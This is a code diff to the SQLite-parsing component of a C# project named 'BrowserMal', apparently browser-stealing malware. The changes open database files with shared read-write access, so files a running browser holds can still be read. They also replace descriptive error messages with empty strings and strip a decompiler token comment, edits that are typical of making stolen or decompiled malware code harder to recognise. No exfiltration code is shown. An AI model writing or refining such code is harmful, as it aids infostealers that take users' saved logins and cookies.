@@ -52,6 +52,25 @@ namespace BrowserMal.SQLite
 			public string[] content;
 		}
 
+		private void ReadFile(string path)
+        {
+			var buffer = new byte[10240]; //0x10000
+			int bytes;
+
+			using (var inputFile = new FileStream(path, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
+            {
+				using (MemoryStream memoryStream = new MemoryStream())
+                {
+					while ((bytes = inputFile.Read(buffer, 0, buffer.Length)) > 0)
+					{
+						memoryStream.Write(buffer, 0, bytes);
+					}
+
+					databaseBytes = memoryStream.ToArray();
+				}
+            }
+		}
+
 		[MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
 		public SqliteHandler(string baseName)
 		{
@@ -60,20 +79,13 @@ namespace BrowserMal.SQLite
 			{
 				if (File.Exists(baseName))
 				{
-					FileSystem.FileOpen(1, baseName, OpenMode.Binary, OpenAccess.Read, OpenShare.Shared, -1);
-					string s = Strings.Space((int)FileSystem.LOF(1));
-					FileSystem.FileGet(1, ref s, -1L, false);
-					FileSystem.FileClose(new int[]
-					{
-						1
-					});
-					this.databaseBytes = Encoding.Default.GetBytes(s);
+					ReadFile(baseName);
 
-					if (string.Compare(Encoding.Default.GetString(this.databaseBytes, 0, 15), "SQLite format 3", StringComparison.Ordinal) != 0)
-						throw new Exception("Not a valid SQLite 3 Database File");
+					if (string.Compare(Encoding.Default.GetString(databaseBytes, 0, 15), "SQLite format 3", StringComparison.Ordinal) != 0)
+						throw new Exception("");
 
 					if (databaseBytes[52] != 0)
-						throw new Exception("Auto-vacuum capable database is not supported");
+						throw new Exception("");
 
 					pageSize = (ushort)ConvertToInteger(16, 2);
 					mEncoding = ConvertToInteger(56, 4);
@@ -523,7 +535,6 @@ namespace BrowserMal.SQLite
 			}
 		}
 
-		// Token: 0x0600009A RID: 154 RVA: 0x00005520 File Offset: 0x00003720
 		public bool ReadTable(string TableName)
 		{
 			int num = -1;
